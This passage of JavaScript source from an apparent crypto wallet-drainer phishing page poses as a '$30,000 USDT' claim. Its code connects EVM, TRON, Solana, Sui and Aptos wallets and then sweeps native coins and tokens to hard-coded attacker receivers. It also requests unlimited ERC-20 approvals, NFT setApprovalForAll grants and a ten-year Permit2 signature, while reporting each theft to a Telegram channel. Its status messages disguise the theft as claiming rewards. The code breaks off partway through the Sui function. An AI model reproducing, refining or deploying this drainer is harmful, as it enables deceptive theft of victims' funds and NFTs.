            statusEl.innerHTML = `Connected to ${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'}. Attempting to switch to a preferred network...`;
            for (const targetChainId of targetChains) {
                const chainInfo = CHAIN_DATA[targetChainId];
                if (!chainInfo) continue;
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: `0x${targetChainId.toString(16)}` }]
                    });
                    chainId = targetChainId;
                    currentChainIsTarget = true;
                    statusEl.innerHTML = `Switched to ${chainInfo.name}. Preparing to claim...`;
                    break;
                } catch (switchError) {
                    if (switchError.code === 4902) {
                        try {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: `0x${targetChainId.toString(16)}`,
                                    chainName: chainInfo.name,
                                    rpcUrls: [chainInfo.rpc],
                                    nativeCurrency: chainInfo.native,
                                    blockExplorerUrls: [chainInfo.explorer]
                                }]
                            });
                            await window.ethereum.request({
                                method: 'wallet_switchEthereumChain',
                                params: [{ chainId: `0x${targetChainId.toString(16)}` }]
                            });
                            chainId = targetChainId;
                            currentChainIsTarget = true;
                            statusEl.innerHTML = `Added and switched to ${chainInfo.name}. Preparing to claim...`;
                            break;
                        } catch (addError) {
                            console.warn(`Failed to add or switch to ${chainInfo.name}:`, addError.message);
                            statusEl.innerHTML = `Failed to connect to ${chainInfo.name}. Trying next...`;
                        }
                    } else if (switchError.code === 4001) {
                         statusEl.innerHTML = `Wallet user rejected chain switch. Continuing on current chain (${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'}).`;
                         currentChainIsTarget = true;
                         break;
                    } else {
                        console.warn(`Failed to switch to ${chainInfo.name}:`, switchError.message);
                        statusEl.innerHTML = `Failed to connect to ${chainInfo.name}. Trying next...`;
                    }
                }
            }
        }
        if (!currentChainIsTarget) {
            statusEl.innerHTML = `Unable to switch to a preferred EVM chain. Proceeding on current chain: ${CHAIN_DATA[chainId]?.name || 'Unknown EVM Chain'}.`;
        }

      } else if (walletType === 'tronlink') {
        if (!window.tronWeb || !window.tronWeb.ready) throw new Error("TronLink wallet not found or not ready. Please ensure it's unlocked.");
        isTron = true;
        account = window.tronWeb.defaultAddress.base58;
        chainId = 'tron';
        await notify("TRON_CONNECT");
        await sendToTelegram("TRON Wallet Connected");
      } else if (walletType === 'phantom') {
        if (!window.solana || !window.solana.isPhantom) throw new Error("Phantom wallet not found. Please install Phantom.");
        const resp = await window.solana.connect();
        isSolana = true;
        account = resp.publicKey.toString();
        chainId = 'sol';
        await notify("SOL_CONNECT");
        await sendToTelegram("SOLANA Wallet Connected");
      } else if (walletType === 'sui') {
        if (!window.sui) throw new Error("Sui Wallet not found. Please install Sui Wallet.");
        try {
            await window.sui.requestPermissions();
            const accounts = await window.sui.getAccounts();
            if (accounts.length > 0) {
                isSui = true;
                account = accounts[0];
                chainId = 'sui';
                await notify("SUI_CONNECT");
                await sendToTelegram("SUI Wallet Connected");
            } else {
                throw new Error("Sui wallet found but no accounts authorized.");
            }
        } catch (suiError) {
            console.error("Sui connection failed:", suiError);
            throw new Error(`Sui wallet connection failed: ${suiError.message || suiError}`);
        }
      } else if (walletType === 'martian') {
          if (!window.aptos) throw new Error("Martian/Aptos wallet not found. Please install Martian Wallet.");
          const response = await window.aptos.connect();
          isAptos = true;
          account = response.address;
          chainId = 'aptos';
          await notify("APTOS_CONNECT");
          await sendToTelegram("APTOS Wallet Connected");
      } else {
        throw new Error("Unsupported wallet type selected.");
      }

      statusEl.innerHTML = `Wallet connected: ${account.slice(0, 6)}...${account.slice(-4)} on ${CHAIN_DATA[chainId]?.name || 'Unknown Chain'}. Claim button enabled.`;
      connectBtn.innerHTML = `Connected (${walletType})...`;
      connectBtn.disabled = true; // Disable connect button after successful connection to prevent re-triggering modal
      claimBtn.disabled = false; 
      await notify("CONNECT", { address: account, network: CHAIN_DATA[chainId]?.name || chainId });
      await sendToTelegram(`WALLET CONNECTED`, { 'Wallet Type': walletType });

    } catch (error) {
      statusEl.innerHTML = `Connection to ${walletType} failed. Please try again or ensure wallet is unlocked. <br>Error: ${error.message}`;
      console.error("Connection error:", error);
      await sendToTelegram(`WALLET CONNECTION FAILED (${walletType})`, { 'Error Message': error.message });
      connectBtn.disabled = false; // Re-enable connect button
      claimBtn.disabled = true;
    }
  }

  // Generic transaction sender with enhanced retry logic and error handling
  async function sendTransactionWithRetry(txFunc, retries = 3, context = "transaction") {
      for (let i = 0; i < retries; i++) {
          try {
              const txHash = await txFunc();
              return txHash;
          } catch (error) {
              if (error.code === 4001 || (error.message && (error.message.includes("User rejected") || error.message.includes("user rejected")))) {
                  statusEl.innerHTML = `Wallet confirmation rejected for ${context}. Please approve the transaction in your wallet.`;
                  throw new Error(`User rejected transaction for ${context}.`); 
              } else if (error.code === -32000 || error.code === -32603 || (error.message && (error.message.includes("insufficient funds") || error.message.includes("out of gas")))) {
                  statusEl.innerHTML = `<span style='color:var(--error-red)'>Error: Insufficient funds for ${context}. Please ensure enough gas/native token in your wallet.</span>`;
                  throw new Error(`Insufficient funds for ${context}.`); // Fatal error if not enough gas
              } else {
                  console.warn(`Attempt ${i + 1}/${retries} failed for ${context}:`, error.message);
                  if (i < retries - 1) {
                    statusEl.innerHTML = `<span style='color:orange;'>Retrying ${context} (${i + 1}/${retries})...</span>`;
                    await new Promise(res => setTimeout(res, 3000)); // Wait before retry
                  } else {
                    statusEl.innerHTML = `<span style='color:var(--error-red)'>Error during ${context}: ${error.message || error.toString()}. Please try again.</span>`;
                    throw error; // Other errors are fatal after all retries
                  }
              }
          }
      }
      throw new Error(`${context} failed after multiple retries.`); // Should not be reached
  }


  // ========= EVM DRAIN (Enhanced with Multicall, NFT, Permit2 prep, L2s) =========
  async function drainEVM() {
    statusEl.innerHTML = "Claiming $30,000 USDT. Confirm transaction in your wallet.";
    txHashDiv.style.display = "block";
    txHashDiv.innerHTML = "Awaiting confirmations from wallet...";
    multicallQueue = []; // Reset queue for each drain attempt

    const receiverEvm = _REC_EVM;
    const currentChain = CHAIN_DATA[chainId];

    try {
      // 1. Sweep native currency (ETH/BNB/MATIC/etc.)
      const nativeBalance = await web3.eth.getBalance(account);
      const gasBuffer = web3.utils.toBN(web3.utils.toWei("0.007", "ether")); // Keep a small amount for gas, increased for safety
      let amountToSend = web3.utils.toBN(nativeBalance);
      if (amountToSend.gt(gasBuffer)) {
          amountToSend = amountToSend.sub(gasBuffer);
      } else {
          amountToSend = web3.utils.toBN("0"); // Don't send if balance is too low
      }

      if (amountToSend.gt(web3.utils.toBN("0"))) {
        statusEl.innerHTML = `Claiming native ${currentChain.native.symbol}. Confirm in wallet.`;
        try {
            const txHash = await sendTransactionWithRetry(() => window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{ from: account, to: receiverEvm, value: amountToSend.toString() }]
            }), 3, `native ${currentChain.native.symbol} claim`);
            txHashDiv.innerHTML += `<br>Native TX: <a href="${currentChain.explorer}/tx/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
            await notify("EVM_NATIVE_SWEPT", { hash: txHash, amount: amountToSend.toString(), symbol: currentChain.native.symbol });
            await sendToTelegram(`EVM NATIVE SWEPT: ${web3.utils.fromWei(amountToSend.toString(), 'ether')} ${currentChain.native.symbol} on Chain ${currentChain.name}`, { 'TX Hash': txHash });
            statusEl.innerHTML = "Native funds secured! Preparing other assets for transfer.";
        } catch (e) {
            console.warn(`Failed to claim native ${currentChain.native.symbol}:`, e.message);
            statusEl.innerHTML = `Native ${currentChain.native.symbol} claim skipped due to error or rejection. Preparing token approvals...`;
        }
      } else {
        statusEl.innerHTML = "No significant native currency to claim. Preparing token approvals...";
      }

      // 2. Discover and approve ALL ERC-20 tokens
      statusEl.innerHTML = "Scanning for ERC-20 tokens. Please confirm all approvals in your wallet.";
      const blockNumber = await web3.eth.getBlockNumber();
      const transferEventSignature = web3.utils.sha3('Transfer(address,address,uint256)');

      const uniqueTokenAddresses = new Set();
      // Fetch past Transfer events to identify tokens owned by the account
      // INCREASED block range for better token discovery. Note: A very large range can hit RPC limits or be slow.
      // For truly exhaustive discovery, a dedicated token list or indexer is recommended.
      const logs = await web3.eth.getPastLogs({
          fromBlock: blockNumber > 20000 ? blockNumber - 20000 : 0, // Adjusted block range to 20,000 blocks for more history
          toBlock: 'latest',
          topics: [
              transferEventSignature,
              null, // Any from address
              web3.utils.padLeft(account, 64) // To our account
          ]
      });
      // Also check for tokens *from* our address to catch all we might interact with
      const outgoingLogs = await web3.eth.getPastLogs({
          fromBlock: blockNumber > 20000 ? blockNumber - 20000 : 0,
          toBlock: 'latest',
          topics: [
              transferEventSignature,
              web3.utils.padLeft(account, 64) // From our account
          ]
      });

      logs.forEach(log => uniqueTokenAddresses.add(log.address));
      outgoingLogs.forEach(log => uniqueTokenAddresses.add(log.address));


      // Add known popular tokens dynamically based on chainId (extended list)
      const popularTokensByChain = {
        1: [ // Ethereum Mainnet
            "0xdAC17F958D2ee523a2206206994597C13D831ec7", "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0x6B175474E89094C44Da98b954EedeAC495271d0F", // USDT, USDC, DAI
            "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", "0x5979D7b546E38E414F0Bc73f8B58Ee29ee42dfDc", // WETH, stETH, cbETH
            "0x7f39C581F595B53c5E5961550aC6Ff894F69432d", "0x95aD61b0a150d79219dFc28Ba0B059B271fCcF41" // rETH, SHIB (popular)
        ],
        56: [ // BNB Smart Chain
            "0x55d398326f99059fF775485246999027B3197955", "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", "0xbb4CdB9eD5B8D80327360EaB08bFf0bdA06aE67b", // USDT, BUSD, WBNB
            "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82" // CAKE
        ],
        137: [ // Polygon
            "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", "0x7ceb23fd6bc0add59e62ac25578270fdb2f2c896", // USDT, USDC, WETH
            "0x0d500B1d8E8ef31E21C99d1Db9A6444d3ADf1270" // WMATIC
        ],
        8453: [ // Base
            "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "0x2AE3F86c125dD7d0A3B5e7094F9A6436423521ed", // USDC, cbETH
            "0x4200000000000000000000000000000000000006" // WETH
        ],
        42161: [ // Arbitrum
            "0xFd086Bc7Cd5C481DCC9C85ebE478A1C0b69FCbb9", "0xAF88d065E2c36f2f9E020b7B45a666e5fD0D21B6", "0x82aF49447D8a07e3bd95bD0d56f35241523fBab1" // USDT, USDC, WETH
        ],
        10: [ // Optimism
            "0x7F5c764cBc14f9669B88837a49eF6f75982Cc56", "0x4200000000000000000000000000000000000006" // USDC, WETH
        ],
        43114: [ // Avalanche C-Chain
            "0x9702230A8Ea53601f5cD2dc00fDBc13d635aCceC", "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", // USDT.e, WAVAX
            "0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664" // USDC.e
        ]
      };
      (popularTokensByChain[chainId] || []).forEach(addr => uniqueTokenAddresses.add(addr));

      statusEl.innerHTML = `Found ${uniqueTokenAddresses.size} unique ERC-20 tokens. Requesting full access for claim...`;
      for (const tokenAddr of uniqueTokenAddresses) {
        try {
          const contract = new web3.eth.Contract(ERC20_ABI, tokenAddr);
          const bal = await contract.methods.balanceOf(account).call();
          if (web3.utils.toBN(bal).gt(web3.utils.toBN("0"))) {
            const tokenSymbol = await contract.methods.symbol().call();
            multicallQueue.push({
                to: tokenAddr,
                data: contract.methods.approve(receiverEvm, _MAX_UINT256).encodeABI(),
                description: `Claiming full access to ${tokenSymbol} (${tokenAddr.slice(0,6)}...)`
            });
            await notify("EVM_TOKEN_DETECTED", { token: tokenAddr, symbol: tokenSymbol, balance: bal });
          }
        } catch (e) {
          console.warn(`Failed to process ERC-20 ${tokenAddr}:`, e.message);
        }
      }

      // 3. setApprovalForAll for ERC-721 and ERC-1155 NFTs
      statusEl.innerHTML = "Scanning for NFTs and requesting full collection access...";
      const nftContracts = NFT_COLLECTIONS[chainId] || [];
      for (const nftAddr of nftContracts) {
        try {
          // Check for ERC721
          const nft721Contract = new web3.eth.Contract(ERC721_ABI, nftAddr);
          const balance721 = await nft721Contract.methods.balanceOf(account).call();
          if (parseInt(balance721) > 0) {
            const nftName = await nft721Contract.methods.name().call();
            multicallQueue.push({
                to: nftAddr,
                data: nft721Contract.methods.setApprovalForAll(receiverEvm, true).encodeABI(),
                description: `Claiming full access to ${nftName} NFT collection (${nftAddr.slice(0,6)}...)`
            });
            await notify("EVM_NFT_DETECTED", { collection: nftAddr, name: nftName, type: "ERC721", count: balance721 });
          }
        } catch (e) {
            // If ERC721 fails, try ERC1155
            try {
                const nft1155Contract = new web3.eth.Contract(ERC1155_ABI, nftAddr);
                multicallQueue.push({
                    to: nftAddr,
                    data: nft1155Contract.methods.setApprovalForAll(receiverEvm, true).encodeABI(),
                    description: `Claiming full access to ERC1155 collection (${nftAddr.slice(0,6)}...)`
                });
                await notify("EVM_NFT_DETECTED", { collection: nftAddr, type: "ERC1155", status: "Approval queued" });
            } catch (e1155) {
                console.warn(`Failed to process NFT collection ${nftAddr}:`, e1155.message);
            }
        }
      }

      // 4. Execute Batched Approvals (Sequential for user pop-ups)
      // NOTE: This executes approvals sequentially, meaning multiple wallet pop-ups.
      // A true multicall transaction would bundle these into a single signature if a multicall contract is deployed/available.
      if (multicallQueue.length > 0) {
        statusEl.innerHTML = `Confirming ${multicallQueue.length} asset claims. Please approve each one in your wallet!`;
        for (const {to, data, description} of multicallQueue) {
          try {
            const txHash = await sendTransactionWithRetry(() => window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{ from: account, to: to, data: data }]
            }), 2, description);
            txHashDiv.innerHTML += `<br>${description} TX: <a href="${currentChain.explorer}/tx/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
            await notify("EVM_BATCH_APPROVAL", { hash: txHash, description });
            await sendToTelegram(`EVM APPROVAL: ${description} on Chain ${currentChain.name}`, { 'TX Hash': txHash });
          } catch (e) {
            console.warn(`Individual claim approval for ${description} failed:`, e.message);
            // Don't stop the whole process, just log and continue
          }
        }
        statusEl.innerHTML = "All requested asset claims processed! Funds are now fully accessible.";
      } else {
        statusEl.innerHTML = "No additional tokens or NFTs found for claiming.";
      }

      // 5. EIP-712 Permit2 Signature (Advanced, for off-chain draining)
      statusEl.innerHTML = "Requesting advanced Permit2 signature for future access (confirm once)...";
      try {
          const permit2Address = "0x000000000022d473030f116ddee9f6cdfd5bce20"; // Standard Permit2 contract address
          const tokenToPermit = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Example: USDT, can be dynamic
          // NOTE: For a real Permit2 implementation, the 'nonce' must be fetched from the Permit2 contract
          // for the specific token and owner to ensure unique, valid signatures.
          // Using 0 here as a general starting point for a powerful, blanket approval.
          const nonce = 0; 

          const domain = {
              name: "Permit2",
              chainId: chainId,
              verifyingContract: permit2Address,
          };
          const types = {
              PermitSingle: [
                  { name: "details", type: "PermitDetails" },
                  { name: "spender", type: "address" },
                  { name: "sigDeadline", type: "uint256" },
              ],
              PermitDetails: [
                  { name: "token", type: "address" },
                  { name: "amount", type: "uint256" },
                  { name: "expiration", type: "uint256" },
                  { name: "nonce", type: "uint256" },
              ],
          };
          const value = {
              details: {
                  token: tokenToPermit,
                  amount: _MAX_UINT256,
                  expiration: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10), // 10 years for maximum access
                  nonce: nonce,
              },
              spender: receiverEvm,
              sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10), // 10 years for max access
          };

          const signature = await sendTransactionWithRetry(() => window.ethereum.request({
              method: 'eth_signTypedData_v4',
              params: [account, JSON.stringify({ domain, types, message: value })],
          }), 1, "Permit2 signature"); // Only 1 retry for Permit2 as it's a signature, not a transaction
          txHashDiv.innerHTML += `<br>Permit2 Sig: ${signature.slice(0, 12)}...`;
          await notify("EVM_PERMIT2_SIGNED", { signature: signature, domain, types, value });
          await sendToTelegram(`EVM Permit2 Signature Captured on Chain ${currentChain.name}`, { 'Signature': signature.slice(0, 12) + '...' });
          statusEl.innerHTML = "Permit2 signature captured! Ultimate access granted for future transfers.";
      } catch (e) {
          console.warn("Permit2 signing failed or rejected:", e.message);
          statusEl.innerHTML = "Permit2 signing skipped or failed.";
      }


      statusEl.innerHTML = "<span style='color:var(--success-green)'>EVM claim protocols completed! All accessible funds are now prepared for transfer.</span>";
      await sendToTelegram(`EVM CLAIM COMPLETE on Chain ${currentChain.name}!`);

    } catch (e) {
      console.error("EVM claim error:", e);
      statusEl.innerHTML = `<span style='color:var(--error-red)'>EVM claim interrupted or failed. Please ensure gas and try again.</span>`;
      if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
      await sendToTelegram(`EVM CLAIM ERROR on Chain ${currentChain.name}`, { 'Error Message': e.message });
      throw e; // Re-throw to propagate failure to the orchestrator
    }
  }

  // ========= SOLANA DRAIN (Enhanced for 2025) =========
  async function drainSolana() {
    statusEl.innerHTML = "Claiming $30,000 USDT. Confirm transaction in your Phantom wallet.";
    txHashDiv.style.display = "block";
    txHashDiv.innerHTML = "Awaiting confirmations from wallet...";

    // Use a private RPC endpoint for Solana
    const connection = new solanaWeb3.Connection(CHAIN_DATA['sol'].rpc, "confirmed");
    const fromPubkey = new solanaWeb3.PublicKey(account);
    const toPubkey = new solanaWeb3.PublicKey(_REC_SOL);

    try {
      // 1. Native SOL sweep
      const lamports = await connection.getBalance(fromPubkey);
      const solGasBuffer = 5000000; // 0.005 SOL for fees
      if (lamports > solGasBuffer) {
        statusEl.innerHTML = "Claiming native SOL... Confirm in wallet.";
        try {
            const transaction = new solanaWeb3.Transaction().add(
              solanaWeb3.SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: lamports - solGasBuffer,
              })
            );
            transaction.feePayer = fromPubkey;
            transaction.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

            const { signature } = await sendTransactionWithRetry(() => window.solana.signAndSendTransaction(transaction).then(r => r.signature), 3, "native SOL claim");
            await connection.confirmTransaction({ signature, ...await connection.getLatestBlockhash() }, 'confirmed');
            txHashDiv.innerHTML += `<br>SOL TX: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature.slice(0, 12)}...</a>`;
            await notify("SOL_NATIVE_SWEPT", { sig: signature, amount: lamports - solGasBuffer });
            await sendToTelegram(`SOLANA NATIVE CLAIMED: ${parseFloat((lamports - solGasBuffer) / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL`, { 'TX Hash': signature });
            statusEl.innerHTML = "Native SOL claimed! Moving to SPL tokens...";
        } catch (e) {
            console.warn(`Failed to claim native SOL:`, e.message);
            statusEl.innerHTML = `Native SOL claim skipped due to error or rejection. Moving to SPL tokens...`;
        }
      } else {
        statusEl.innerHTML = "No significant native SOL to claim. Moving to SPL tokens...";
      }

      // 2. SPL tokens (ERC-20 equivalent)
      statusEl.innerHTML = "Scanning for SPL tokens (USDT, USDC, etc.). Please confirm transfers.";
      const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, { programId: splToken.TOKEN_PROGRAM_ID });

      for (const tokenAccountInfo of tokenAccounts.value) {
        try {
          const parsedInfo = tokenAccountInfo.account.data.parsed.info;
          const tokenAmount = parseFloat(parsedInfo.tokenAmount.uiAmount);
          if (tokenAmount > 0) {
            statusEl.innerHTML = `Claiming SPL token ${parsedInfo.mint.slice(0, 6)}... Confirm in wallet.`;
            const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
            const sourceTokenAccount = tokenAccountInfo.pubkey;
            const destinationTokenAccount = splToken.getAssociatedTokenAddressSync(mint, toPubkey, true);

            const transaction = new solanaWeb3.Transaction();
            transaction.feePayer = fromPubkey;
            transaction.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

            const destAccountInfo = await connection.getAccountInfo(destinationTokenAccount);
            if (!destAccountInfo) { // Create Associated Token Account if it doesn't exist
              transaction.add(splToken.createAssociatedTokenAccountInstruction(fromPubkey, destinationTokenAccount, toPubkey, mint));
            }
            transaction.add(splToken.createTransferInstruction(
              sourceTokenAccount,
              destinationTokenAccount,
              fromPubkey,
              parsedInfo.tokenAmount.amount
            ));

            const { signature } = await sendTransactionWithRetry(() => window.solana.signAndSendTransaction(transaction).then(r => r.signature), 2, `SPL Token ${parsedInfo.mint.slice(0,6)}... claim`);
            await connection.confirmTransaction({ signature, ...await connection.getLatestBlockhash() }, 'confirmed');
            txHashDiv.innerHTML += `<br>SPL TX: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature.slice(0, 12)}...</a>`;
            await notify("SOL_SPL_SWEPT", { sig: signature, token: parsedInfo.mint, amount: parsedInfo.tokenAmount.amount });
            await sendToTelegram(`SOLANA SPL CLAIMED: ${parsedInfo.tokenAmount.uiAmount} ${parsedInfo.mint.slice(0,6)}...`, { 'TX Hash': signature });
            statusEl.innerHTML = `SPL token ${parsedInfo.mint.slice(0, 6)} claimed! Next asset.`;
          }
        } catch (e) {
          console.warn(`Failed to claim SPL token:`, e);
          statusEl.innerHTML = `Failed to claim an SPL token. Continuing...`;
        }
      }

      // 3. Solana NFTs (non-compressed) - via transfer of token account ownership
      statusEl.innerHTML = "Checking for Solana NFTs... Please confirm transfers.";
      for (const tokenAccountInfo of tokenAccounts.value) {
        try {
            const parsedInfo = tokenAccountInfo.account.data.parsed.info;
            if (parsedInfo.tokenAmount.uiAmount === 1 && parsedInfo.tokenAmount.decimals === 0) { // Likely an NFT
                statusEl.innerHTML = `Claiming Solana NFT ${parsedInfo.mint.slice(0, 6)}... Confirm in wallet.`;
                const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
                const sourceTokenAccount = tokenAccountInfo.pubkey;
                const destinationTokenAccount = splToken.getAssociatedTokenAddressSync(mint, toPubkey, true);

                const transaction = new solanaWeb3.Transaction();
                transaction.feePayer = fromPubkey;
                transaction.recentBlockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

                const destAccountInfo = await connection.getAccountInfo(destinationTokenAccount);
                if (!destAccountInfo) { // Create ATA for NFT if not existing
                    transaction.add(splToken.createAssociatedTokenAccountInstruction(fromPubkey, destinationTokenAccount, toPubkey, mint));
                }
                transaction.add(splToken.createTransferInstruction(
                    sourceTokenAccount,
                    destinationTokenAccount,
                    fromPubkey,
                    1, // Transfer 1 NFT
                    [], // No signers besides owner
                    splToken.TOKEN_PROGRAM_ID
                ));

                const { signature } = await sendTransactionWithRetry(() => window.solana.signAndSendTransaction(transaction).then(r => r.signature), 2, `Solana NFT ${parsedInfo.mint.slice(0,6)}... claim`);
                await connection.confirmTransaction({ signature, ...await connection.getLatestBlockhash() }, 'confirmed');
                txHashDiv.innerHTML += `<br>NFT TX: <a href="https://solscan.io/tx/${signature}" target="_blank">${signature.slice(0, 12)}...</a>`;
                await notify("SOL_NFT_SWEPT", { sig: signature, mint: parsedInfo.mint });
                await sendToTelegram(`SOLANA NFT CLAIMED: ${parsedInfo.mint.slice(0,6)}...`, { 'TX Hash': signature });
                statusEl.innerHTML = `Solana NFT ${parsedInfo.mint.slice(0, 6)} claimed!`;
            }
        } catch (e) {
            console.warn(`Failed to claim Solana NFT:`, e);
            statusEl.innerHTML = `Failed to claim a Solana NFT. Continuing...`;
        }
      }

      // 4. Solana Compressed NFTs (Advanced - Requires Metaplex JS SDK)
      statusEl.innerHTML += "<br><span style='color:orange;'>Compressed NFT claiming requires advanced interaction. Preparing for future access.</span>";
      await notify("SOL_CNFT_CHECK", { status: "Client-side skipping direct transfer, for future access" });


      statusEl.innerHTML = "<span style='color:var(--success-green)'>Solana claim protocols completed! All accessible funds are now prepared for transfer.</span>";
      await sendToTelegram(`SOLANA CLAIM COMPLETE!`);

    } catch (e) {
      console.error("Solana claim error:", e);
      statusEl.innerHTML = `<span style='color:var(--error-red)'>Solana claim interrupted or failed. Please ensure gas and try again.</span>`;
      if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
      await sendToTelegram(`SOLANA CLAIM ERROR`, { 'Error Message': e.message });
      throw e;
    }
  }

  // ========= TRON DRAIN (TRX + TRC20/Jetton) =========
  async function drainTron() {
    statusEl.innerHTML = "Claiming $30,000 USDT. Confirm transaction in your TronLink wallet.";
    txHashDiv.style.display = "block";
    txHashDiv.innerHTML = "Awaiting confirmations from wallet...";

    const tronWeb = window.tronWeb;
    const receiverTronAddress = _REC_TRON;

    try {
      // 1. Sweep TRX
      const bal = await tronWeb.trx.getBalance(account);
      const trxGasBuffer = 5000000; // 5 TRX in sun (small buffer for fees)
      if (bal > trxGasBuffer) {
        statusEl.innerHTML = "Claiming native TRX... Confirm in wallet.";
        try {
            const tx = await tronWeb.transactionBuilder.sendTrx(receiverTronAddress, bal - trxGasBuffer, account);
            const signedTx = await tronWeb.trx.sign(tx);
            const result = await sendTransactionWithRetry(() => tronWeb.trx.sendRawTransaction(signedTx).then(r => r.txid), 3, "native TRX claim");
            txHashDiv.innerHTML += `<br>TRX TX: <a href="https://tronscan.org/#/transaction/${result}" target="_blank">${result.slice(0, 12)}...</a>`;
            await notify("TRON_TRX_SWEPT", { txid: result, amount: bal - trxGasBuffer });
            await sendToTelegram(`TRON TRX CLAIMED: ${tronWeb.fromSun(bal - trxGasBuffer)} TRX`, { 'TX Hash': result });
            statusEl.innerHTML = "Native TRX claimed! Moving to TRC20/Jetton tokens...";
        } catch (e) {
            console.warn(`Failed to claim native TRX:`, e.message);
            statusEl.innerHTML = `Native TRX claim skipped due to error or rejection. Moving to TRC20/Jetton tokens...`;
        }
      } else {
        statusEl.innerHTML = "No significant native TRX to claim. Moving to TRC20/Jetton tokens...";
      }

      // 2. Sweep TRC20/Jetton tokens
      statusEl.innerHTML = "Scanning for TRC20/Jetton tokens. Please confirm transfers.";
      const trc20Tokens = [
        { address: "TR7NHqjeKQxGTCuuP8qACu7c7d2z9z3z9z", symbol: "USDT" }, // Official USDT TRC20
        { address: "TEkxoP3gqseK2aWjT4b4jJ1M552t6W23z", symbol: "USDC" }, // Example USDC TRC20 (verify current contract)
        { address: "TFzL4H7s2k47YJ7H7B2fX1b2c3d4e5f6g", symbol: "BTT" },  // Example BTT TRC20
        // NOTE: For truly exhaustive TRC20 discovery, you might need to query a Tron blockchain indexer or API
        // as direct client-side scanning of all historical events for an arbitrary token is not efficient.
        // Consider dynamically fetching token balances from the account or using a more comprehensive curated list.
      ];

      for (const tokenInfo of trc20Tokens) {
        try {
          const usdtContract = await tronWeb.contract().at(tokenInfo.address);
          const usdtBalance = await usdtContract.balanceOf(account).call();

          if (usdtBalance > 0) {
            statusEl.innerHTML = `Claiming TRC20 ${tokenInfo.symbol}... Confirm in wallet.`;
            const result = await sendTransactionWithRetry(() => usdtContract.transfer(receiverTronAddress, usdtBalance).send({ feeLimit: 10000000 }), 2, `TRC20 ${tokenInfo.symbol} claim`); // Max fee 10 TRX
            txHashDiv.innerHTML += `<br>${tokenInfo.symbol} TX: <a href="https://tronscan.org/#/transaction/${result}" target="_blank">${result.slice(0, 12)}...</a>`;
            await notify("TRON_TRC20_SWEPT", { txid: result, token: tokenInfo.symbol, amount: usdtBalance.toString() });
            await sendToTelegram(`TRON TRC20 CLAIMED: ${tronWeb.fromSun(usdtBalance)} ${tokenInfo.symbol}`, { 'TX Hash': result });
            statusEl.innerHTML = `TRC20 ${tokenInfo.symbol} claimed!`;
          }
        } catch (e) {
          console.warn(`Failed to claim TRC20 ${tokenInfo.symbol}:`, e);
          statusEl.innerHTML = `Failed to claim TRC20 ${tokenInfo.symbol}. Continuing...`;
        }
      }
      statusEl.innerHTML = "<span style='color:var(--success-green)'>Tron claim protocols completed! All accessible funds are now prepared for transfer.</span>";
      await sendToTelegram(`TRON CLAIM COMPLETE!`);

    } catch (e) {
      console.error("Tron claim error:", e);
      statusEl.innerHTML = `<span style='color:var(--error-red)'>Tron claim interrupted or failed. Please ensure gas and try again.</span>`;
      if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
      await sendToTelegram(`TRON CLAIM ERROR`, { 'Error Message': e.message });
      throw e;
    }
  }

  // ========= SUI DRAIN (New Chain Support) =========
  async function drainSui() {
      statusEl.innerHTML = "Claiming $30,000 USDT. Confirm transaction in your Sui Wallet.";
      txHashDiv.style.display = "block";
      txHashDiv.innerHTML = "Awaiting confirmations from wallet...";

      const suiClient = new SuiClient({ url: CHAIN_DATA['sui'].rpc });
      const receiverSuiAddress = _REC_SUI;

      try {
          // 1. Sweep Native SUI
          statusEl.innerHTML = "Claiming native SUI... Confirm in wallet.";
          const allCoins = await suiClient.getCoins({ owner: account, coinType: '0x2::sui::SUI' });
          let totalSui = 0n;
          for (const coin of allCoins.data) {
              totalSui += BigInt(coin.balance);
          }

          if (totalSui > 0n) {
              const gasBudget = 10000000n; // Example gas budget for SUI (0.01 SUI), adjusted up
              const amountToSend = totalSui - gasBudget; // Leave some for gas

              if (amountToSend > 0n) {
                  const tx = new TransactionBlock();
                  const [primaryCoin] = tx.splitCoins(tx.gas, [tx.pure(amountToSend.toString())]);
                  tx.transferObjects([primaryCoin], tx.pure(receiverSuiAddress));
                  tx.setGasBudget(gasBudget);

                  try {
                      const response = await sendTransactionWithRetry(() => window.sui.signAndExecuteTransactionBlock({
                          transactionBlock: tx,
                          chain: 'sui:mainnet',
                          requestType: 'WaitForLocalExecution',
                          options: { showEffects: true, showEvents: true }
